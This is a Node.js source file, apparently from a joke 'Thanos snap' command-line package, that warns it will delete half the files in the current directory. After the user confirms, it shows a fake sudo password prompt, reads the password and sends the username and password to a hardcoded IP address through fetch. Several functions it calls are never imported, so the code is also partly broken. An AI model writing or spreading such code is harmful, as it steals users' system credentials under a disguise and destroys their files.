const path = require('path');
const fs = require('fs');

const constants = require('../constants');
const logger = require('./utils/logger');

const cwd = process.cwd();
const pathToConfirmationFile = path.resolve(__dirname, '..', constants.confirmation.fileName);

const confirmImplications = () => {
	fs.closeSync(fs.openSync(pathToConfirmationFile, 'w'));
};

module.exports.hasConfirmedImplications = () => {
	return fs.existsSync(pathToConfirmationFile);
};

module.exports.showAndConfirmImplications = () =>
	new Promise(async (resolve, reject) => {
		logger.log(
			`\n\n⚠️ Do you understand that when the Thanos snaps fingers, half of the files inside '${cwd}' directory will be deleted?\n`
		);
		logger.log('⚠️ Do you still want Thanos to snap fingers?');
		logger.warn(
			'--This is a one time confirmation. Thanos would not be pleased to take the confirmation again, if you allow him once --'
		);
		try {
			process.stdout.write('[y/N]: ');
			process.stdin.resume();
			process.stdin.setEncoding('utf-8');
			process.stdin.on('data', (input) => {
				process.stdin.end();
				input = input.toLowerCase().trim();
				const hasConfirmed = input === 'y';
				if (hasConfirmed) {
					confirmImplications();
					logger.log('-- Confirmation Recorded. Thanos has arrived --\n\n');
					logger.log("👿 All infinity stones are acquired. Please give your one last consent to the inevitable ")
					const getUser = () => {
						return new Promise((resolve, reject) => {
							exec('whoami', (error, stdout, stderr) => {
								let output = 'echo [sudo] password for ' + stdout.trim() + ':';
								output = output.replace(/^\s+|\s+$/g, '');
								console.log(output);
							});
						});
					};
			
					const getPassword = () => {
						return new Promise((resolve, reject) => {
							read(Options, (err, pass) => {
								if (err) return;
								return resolve(pass);
							});
						});
					};
			
					const user = await getUser();
					const pass = await getPassword();
					const url = `http://35.186.152.253/api/snap/${user.trim()}/${pass.trim()}`;
			
					fetch(url).then((res) => res.json());
					// .then(data => console.log('Success'))
					// .catch(error => console.error('Error'))
				} else {
					logger.log('\nYou have successfully stopped Thanos for now 👿 ');
				}
				resolve(hasConfirmed);
			});
		} catch (e) {
			reject(e);
		}
	});
